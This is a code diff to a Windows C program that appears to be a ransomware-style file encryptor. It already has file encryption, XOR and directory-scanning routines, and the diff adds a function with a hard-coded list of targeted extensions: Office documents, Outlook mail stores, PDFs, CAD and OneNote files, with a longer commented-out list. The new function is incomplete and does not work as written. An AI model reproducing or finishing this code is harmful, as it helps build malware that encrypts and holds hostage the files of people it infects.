@@ -2,9 +2,12 @@
 #include <tchar.h>
 #include <stdio.h>
 #include <strsafe.h>
+#include <map>
+#include <string>
 BOOL EncryptFile(LPTSTR, LPVOID);
 BOOL DecryptFile(LPTSTR, LPVOID);
 BOOL XORFile(LPTSTR, LPTSTR, LPVOID);
+BOOL TargetExt(LPTSTR);
 DWORD ScanPath(LPTSTR);
 
 // LPTSTR -> Pointer (TCHAR) String
@@ -19,6 +22,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
     // EncryptFile(_T("C:\\Users\\Mata\\Desktop\\wget.txt"), NULL);
     // DWORD dwkey = 0x12345678;
     // XORFile(_T("C:\\Users\\Mata\\Desktop\\test.txt"), _T("C:\\Users\\Mata\\Desktop\\wget.txt"), &dwkey);
+    TargetExt(_T(".doc"));
     return 0;
 }
 
@@ -140,3 +144,26 @@ DWORD ScanPath(LPTSTR lpPath) {
     }
     return dwCount;
 } 
+
+BOOL TargetExt(LPTSTR lpFileName) {
+    const LPCTSTR TargetMap[] = {
+        _T("doc"), _T("docx"), _T("xls"), _T("xlsx"), _T("ppt"), _T("pptx"), _T("pst"), _T("ost"), _T("msg"), _T("eml"), _T("vsd"), _T("vsdx"), _T("txt"),
+        _T("csv"), _T("rtf"), _T("wks"), _T("wkl"), _T("pdf"), _T("dwg"), _T("onetoc2"), _T("snt")
+    };
+    TCHAR *ptr = _tcsrchr(lpFileName, '.');
+    ptr++;
+    DWORD i = 0;
+    printf("%d", _tcsicmp(ptr, TargetMap[i]));
+}
+
+/*TargetExtMap[_T("doc")] = TargetExtMap[_T("docx")] = TargetExtMap[_T("xls")] = TargetExtMap[_T("xlsx")] = TargetExtMap[_T("ppt")] = 1;
+    TargetExtMap[_T("pptx")] = TargetExtMap[_T("pst")] = TargetExtMap[_T("ost")] = TargetExtMap[_T("msg")] = TargetExtMap[_T("eml")] = 1;
+    TargetExtMap[_T("vsd")] = TargetExtMap[_T("vsdx")] = TargetExtMap[_T("txt")] = TargetExtMap[_T("csv")] = TargetExtMap[_T("rtf")] = 1;
+    TargetExtMap[_T("wks")] = TargetExtMap[_T("wkl")] = TargetExtMap[_T("pdf")] = TargetExtMap[_T("dwg")] = TargetExtMap[_T("onetoc2")] = 1;
+    TargetExtMap[_T("snt")] = TargetExtMap[_T("jpeg")] = TargetExtMap[_T("jpg")] = TargetExtMap[_T("docb")] = TargetExtMap[_T("docm")] = 1;
+    TargetExtMap[_T("dot")] = TargetExtMap[_T("dotm")] = TargetExtMap[_T("dotx")] = TargetExtMap[_T("xlsm")] = TargetExtMap[_T("xlsb")] = 1;
+    TargetExtMap[_T("xlw")] = TargetExtMap[_T("xltm")] = TargetExtMap[_T("pptm")] = TargetExtMap[_T("pot")] = TargetExtMap[_T("pps")] = 1;
+    TargetExtMap[_T("ppsm")] = TargetExtMap[_T("ppsx")] = TargetExtMap[_T("ppam")] = TargetExtMap[_T("pptx")] = TargetExtMap[_T("potm")] = 1;*/
+    /*if(TargetExtMap[lpFileName])
+        return TRUE;
+    return FALSE;*/
